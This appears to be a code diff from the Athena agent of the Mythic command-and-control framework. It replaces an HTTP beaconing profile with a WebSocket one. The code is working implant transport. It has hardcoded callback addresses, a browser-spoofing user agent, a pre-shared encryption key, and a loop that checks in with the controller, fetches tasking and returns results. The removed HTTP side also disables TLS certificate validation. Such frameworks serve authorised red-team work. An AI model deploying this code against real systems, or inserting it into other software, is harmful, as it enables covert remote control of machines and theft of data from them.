@@ -1,129 +1,67 @@
-﻿using Athena.Commands;
-using Athena.Models.Athena.Commands;
-using Athena.Models.Config;
+﻿using Athena.Models.Config;
+using Athena.Utilities;
+using System.Text.Json;
+using System.Net.WebSockets;
+using System.Text;
 using Athena.Models.Mythic.Checkin;
+using System.Text.Json.Serialization;
+using System.Diagnostics;
+using Athena.Models.Athena.Commands;
 using Athena.Models.Mythic.Response;
 using Athena.Models.Mythic.Tasks;
-using Athena.Utilities;
+using Athena.Commands;
+using Athena.Profiles.Websocket;
 
-using System.Diagnostics;
-using System.Net;
-using System.Net.Security;
-using System.Text.Json;
-
-namespace Athena.Profiles.HTTP
+namespace Athena
 {
-    public class HTTP : IProfile
+    public class Websocket : IProfile
     {
         public string uuid { get; set; }
-        private string userAgent { get; set; }
-        private string hostHeader { get; set; }
-        private string getURL { get; set; }
-        private string postURL { get; set; }
         public string psk { get; set; }
-        private string proxyHost { get; set; }
-        private string proxyPass { get; set; }
-        private string proxyUser { get; set; }
-        private bool encryptedExchangeCheck { get; set; }
+        public string url { get; set; }
+        public string endpoint { get; set; }
+        public string userAgent { get; set; }
+        public string hostHeader { get; set; }
+        public bool encryptedExchangeCheck { get; set; }
         public bool encrypted { get; set; }
-        private int maxAttempts = 5;
-        private int currentAttempt { get; set; }
         public int sleep { get; set; }
         public int jitter { get; set; }
-        public PSKCrypto crypt { get; set; }
-        private HttpClient client { get; set; }
+        private int currentAttempt = 0;
+        private int maxAttempts = 5;
+        public int connectAttempts { get; set; }
         public DateTime killDate { get; set; }
+        public ClientWebSocket ws { get; set; }
+        public PSKCrypto crypt { get; set; }
         private CancellationTokenSource cts = new CancellationTokenSource();
         public event EventHandler<TaskingReceivedArgs> SetTaskingReceived;
-
-        public HTTP()
+        public Websocket()
         {
-            HttpClientHandler handler = new HttpClientHandler();
-            int callbackPort = Int32.Parse("80");
-            string callbackHost = "http://192.168.4.216";
-            string getUri = "index";
-            string queryPath = "q";
-            string postUri = "data";
-            this.userAgent = "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko";
-            this.hostHeader = "";
-            this.getURL = $"{callbackHost}:{callbackPort}/{getUri}?{queryPath}=";
-            this.postURL = $"{callbackHost}:{callbackPort}/{postUri}";
-            this.proxyHost = ":";
-            this.proxyPass = "";
-            this.proxyUser = "";
-            this.psk = "eT1Stx3aqP6gfh2uOBCPCjfO1V/Di5tBmIoz0DLAl0Q=";
-            this.uuid = "d6fcee18-9c4d-4502-b4ba-ea07eb2314ed";
+            int callbackPort = Int32.Parse("8081");
+            string callbackHost = "ws://192.168.4.234";
+            this.endpoint = "socket";
             DateTime kd = DateTime.TryParse("killdate", out kd) ? kd : DateTime.MaxValue;
             this.killDate = kd;
-            int sleep = int.TryParse("callback_interval", out sleep) ? sleep : 60;
-            this.sleep = sleep;
-            int jitter = int.TryParse("callback_jitter", out jitter) ? jitter : 10;
-            this.jitter = jitter;
-            //Might need to make this configurable
-            ServicePointManager.ServerCertificateValidationCallback =
-                   new RemoteCertificateValidationCallback(
-                        delegate
-                        { return true; }
-                    );
-
-            if (!string.IsNullOrEmpty(this.proxyHost) && this.proxyHost != ":")
-            {
-                WebProxy wp = new WebProxy()
-                {
-                    Address = new Uri(this.proxyHost)
-                };
-
-                if (!string.IsNullOrEmpty(this.proxyPass) && !string.IsNullOrEmpty(this.proxyUser))
-                {
-                    handler.DefaultProxyCredentials = new NetworkCredential(this.proxyUser, this.proxyPass);
-                }
-                handler.Proxy = wp;
-            }
-
-            this.client = new HttpClient(handler);
-
-            if (!string.IsNullOrEmpty(this.hostHeader))
-            {
-                this.client.DefaultRequestHeaders.Host = this.hostHeader;
-            }
-
-            if (!string.IsNullOrEmpty(this.userAgent))
-            {
-                this.client.DefaultRequestHeaders.UserAgent.ParseAdd(this.userAgent);
-            }
-
-            //Doesn't do anything yet
-            this.encryptedExchangeCheck = bool.Parse("False");
-
+            this.url = $"{callbackHost}:{callbackPort}/{this.endpoint}";
+            this.userAgent = "USER_AGENT";
+            this.hostHeader = "%HOSTHEADER%";
+            this.psk = "rpfZ1fwiz8pXXy33eDYW7bU6iZLjezOhObwqQHy4/cE=";
+            this.encryptedExchangeCheck = bool.Parse("false");
+            this.uuid = "5ccee0dc-7606-4c7b-8940-6f3c6f77d13c";
             if (!string.IsNullOrEmpty(this.psk))
             {
                 this.crypt = new PSKCrypto(this.uuid, this.psk);
                 this.encrypted = true;
             }
-        }
-        public async Task<CheckinResponse> Checkin(Checkin checkin)
-        {
-            int maxAttempts = 3;
-            int currentAttempt = 0;
-            do
-            {
-                string res = await this.Send(JsonSerializer.Serialize(checkin, CheckinJsonContext.Default.Checkin));
 
-                if (!string.IsNullOrEmpty(res))
-                {
-                    return JsonSerializer.Deserialize(res, CheckinResponseJsonContext.Default.CheckinResponse);
-                }
-                currentAttempt++;
-            } while (currentAttempt <= maxAttempts);
+            this.ws = new ClientWebSocket();
 
-            return new CheckinResponse()
+            if (!String.IsNullOrEmpty(this.hostHeader))
             {
-                status = "failed"
-            };
+                this.ws.Options.SetRequestHeader("Host", this.hostHeader);
+            }
         }
         public async Task StartBeacon()
         {
-            //Main beacon loop handled here
             this.cts = new CancellationTokenSource();
             while (!cts.Token.IsCancellationRequested)
             {
@@ -180,14 +118,65 @@ namespace Athena.Profiles.HTTP
         }
         public bool StopBeacon()
         {
-            cts.Cancel();
+            this.cts.Cancel();
             return true;
         }
-        internal async Task<string> Send(string json)
+        public async Task<CheckinResponse> Checkin(Checkin checkin)
         {
+            int maxAttempts = 3;
+            int currentAttempt = 0;
+            do
+            {
+                string res = await this.Send(JsonSerializer.Serialize(checkin, CheckinJsonContext.Default.Checkin));
+
+                if (!string.IsNullOrEmpty(res))
+                {
+                    return JsonSerializer.Deserialize(res, CheckinResponseJsonContext.Default.CheckinResponse);
+                }
+                currentAttempt++;
+            } while (currentAttempt <= maxAttempts);
+
+            return new CheckinResponse()
+            {
+                status = "failed"
+            };
+        }
+        public async Task<bool> Connect(string url)
+        {
+            this.connectAttempts = 0;
             try
             {
-                Debug.WriteLine($"[{DateTime.Now}] Message to Mythic: {json}");
+                ws = new ClientWebSocket();
+                await ws.ConnectAsync(new Uri(url), CancellationToken.None);
+
+                while (ws.State != WebSocketState.Open)
+                {
+                    if (this.connectAttempts == 300)
+                    {
+                        Environment.Exit(0);
+                    }
+                    await Task.Delay(3000);
+                    this.connectAttempts++;
+                }
+                return true;
+            }
+            catch
+            {
+                return false;
+            }
+        }
+        public async Task<string> Send(string json)
+        {
+            if (this.ws.State != WebSocketState.Open)
+            {
+                Debug.WriteLine($"[{DateTime.Now}] Lost socket connection, attempting to re-establish.");
+                await Connect(this.url);
+            }
+
+            Debug.WriteLine($"[{DateTime.Now}] Message to Mythic: {json}");
+
+            try
+            {
                 if (this.encrypted)
                 {
                     json = this.crypt.Encrypt(json);
@@ -197,34 +186,37 @@ namespace Athena.Profiles.HTTP
                     json = await Misc.Base64Encode(this.uuid + json);
                 }
 
-                HttpResponseMessage response;
-                Debug.WriteLine(this.getURL + json.Replace("=", "").Replace('+', '-').Replace('/', '_'));
-                if (json.Length < 2000) //Max URL length
+                WebSocketMessage m = new WebSocketMessage()
                 {
-                    Debug.WriteLine($"[{DateTime.Now}] Sending as GET");
-                    //response = await this.client.GetAsync(this.getURL + WebUtility.UrlEncode(json));
-                    response = await this.client.GetAsync(this.getURL + json.Replace('+','-').Replace('/', '_'));
-                }
-                else
+                    client = true,
+                    data = json,
+                    tag = String.Empty
+                };
+
+                string message = JsonSerializer.Serialize(m, WebsocketJsonContext.Default.WebSocketMessage);
+                byte[] msg = Encoding.UTF8.GetBytes(message);
+                Debug.WriteLine($"[{DateTime.Now}] Sending Message and waiting for resopnse.");
+                await ws.SendAsync(msg, WebSocketMessageType.Text, true, CancellationToken.None);
+                message = await Receive(ws);
+
+                if (String.IsNullOrEmpty(message))
                 {
-                    Debug.WriteLine($"[{DateTime.Now}] Sending as POST");
-                    response = await this.client.PostAsync(this.postURL, new StringContent(json));
+                    Debug.WriteLine($"[{DateTime.Now}] Response was empty.");
+                    return String.Empty;
                 }
 
-                Debug.WriteLine($"[{DateTime.Now}] Got Response with code: {response.StatusCode}");
-
-                string strRes = await response.Content.ReadAsStringAsync();
+                m = JsonSerializer.Deserialize<WebSocketMessage>(message, WebsocketJsonContext.Default.WebSocketMessage);
 
                 if (this.encrypted)
                 {
-                    Debug.WriteLine($"[{DateTime.Now}] Message from Mythic: {this.crypt.Decrypt(strRes)}");
-                    return this.crypt.Decrypt(strRes);
+                    Debug.WriteLine($"[{DateTime.Now}] Message from Mythic: {this.crypt.Decrypt(m.data)}");
+                    return this.crypt.Decrypt(m.data);
                 }
 
-                if (!string.IsNullOrEmpty(strRes))
+                if (!string.IsNullOrEmpty(json))
                 {
-                    Debug.WriteLine($"[{DateTime.Now}] Message from Mythic: {Misc.Base64Decode(strRes).Result.Substring(36)}");
-                    return (await Misc.Base64Decode(strRes)).Substring(36);
+                    Debug.WriteLine($"[{DateTime.Now}] Message from Mythic: {Misc.Base64Decode(m.data).Result.Substring(36)}");
+                    return (await Misc.Base64Decode(m.data)).Substring(36);
                 }
 
                 return String.Empty;
@@ -234,6 +226,38 @@ namespace Athena.Profiles.HTTP
                 return String.Empty;
             }
         }
-    }
+        static async Task<string> Receive(ClientWebSocket socket)
+        {
+            try
+            {
+                var buffer = new ArraySegment<byte>(new byte[2048]);
+                do
+                {
+                    WebSocketReceiveResult result;
+                    using (var ms = new MemoryStream())
+                    {
+                        do
+                        {
+                            result = await socket.ReceiveAsync(buffer, CancellationToken.None);
+                            await ms.WriteAsync(buffer.Array, buffer.Offset, result.Count);
+                        } while (!result.EndOfMessage);
 
+                        if (result.MessageType == WebSocketMessageType.Close)
+                            break;
+
+                        ms.Seek(0, SeekOrigin.Begin);
+                        using (var reader = new StreamReader(ms, Encoding.UTF8))
+                            return (await reader.ReadToEndAsync());
+                    }
+
+                } while (true);
+
+                return String.Empty;
+            }
+            catch
+            {
+                return String.Empty;
+            }
+        }
+    }
 }
